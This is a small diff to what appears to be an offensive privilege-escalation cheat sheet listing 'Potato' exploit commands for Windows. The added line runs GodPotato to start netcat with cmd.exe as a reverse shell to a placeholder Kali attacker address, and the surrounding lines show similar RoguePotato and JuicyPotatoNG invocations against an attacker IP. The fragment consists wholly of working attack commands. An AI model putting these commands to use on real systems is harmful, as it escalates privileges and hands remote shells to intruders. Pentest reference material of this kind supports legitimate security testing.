@@ -1294,6 +1294,7 @@ RoguePotato.exe -r <AttackerIP> -e "shell.exe" -l 9999
 #GodPotato
 GodPotato.exe -cmd "cmd /c whoami"
 GodPotato.exe -cmd "shell.exe"
+./GodPotato-NET4.exe -cmd "cmd /c C:\Users\chris\Desktop\nc64.exe -t -e C:\Windows\System32\cmd.exe <KALI-IP> <KALI-PORT>"
 
 #JuicyPotatoNG
 JuicyPotatoNG.exe -t * -p "shell.exe" -a
